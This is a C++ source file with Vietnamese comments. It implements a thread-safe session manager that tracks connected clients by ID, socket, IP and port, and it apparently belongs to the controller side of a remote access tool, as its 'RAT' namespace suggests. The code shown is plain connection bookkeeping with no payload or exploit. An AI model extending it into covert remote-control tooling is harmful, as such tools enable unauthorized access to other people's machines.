#include "session_manager.h"
#include "socket_utils.h"

namespace RAT
{
    SessionManager::~SessionManager()
    {
        close_all();
    }

    // Thêm một client mới
    int SessionManager::add_session(int sock, const std::string &ip, int port)
    {
        std::lock_guard<std::mutex> lock(map_mtx_);
        
        // Tái sử dụng ID số nguyên dương nhỏ nhất còn trống (bắt đầu từ 1)
        int id = 1;
        while (sessions_.find(id) != sessions_.end())
        {
            id++;
        }

        auto session = std::make_shared<ClientSession>();
        session->id = id;
        session->socket_fd = sock;
        session->ip = ip;
        session->port = port;
        session->connect_time = std::chrono::system_clock::now();

        // Thêm vào danh sách sessions_
        sessions_[id] = session;
        return id;
    }

    // Xóa một client theo ID (và đóng socket)
    void SessionManager::remove_session(int id)
    {
        std::lock_guard<std::mutex> lock(map_mtx_);
        auto it = sessions_.find(id);
        if (it != sessions_.end())
        {
            close_socket(it->second->socket_fd);
            sessions_.erase(it);
        }
    }

    // Lấy thông tin session theo ID
    std::shared_ptr<ClientSession> SessionManager::get_session(int id)
    {
        std::lock_guard<std::mutex> lock(map_mtx_);
        auto it = sessions_.find(id);
        if (it != sessions_.end())
        {
            return it->second;
        }
        return nullptr;
    }

    // Lấy danh sách toàn bộ các session đang online
    std::unordered_map<int, std::shared_ptr<ClientSession>> SessionManager::get_all_sessions()
    {
        std::lock_guard<std::mutex> lock(map_mtx_);
        return sessions_; // Trả về bản sao để duyệt an toàn
    }

    // Đếm số lượng client đang online
    size_t SessionManager::count()
    {
        std::lock_guard<std::mutex> lock(map_mtx_);
        return sessions_.size();
    }

    // Đóng toàn bộ các kết nối
    void SessionManager::close_all()
    {
        std::lock_guard<std::mutex> lock(map_mtx_);
        for (auto &[id, session] : sessions_)
        {
            close_socket(session->socket_fd);
        }
        sessions_.clear();
    }
}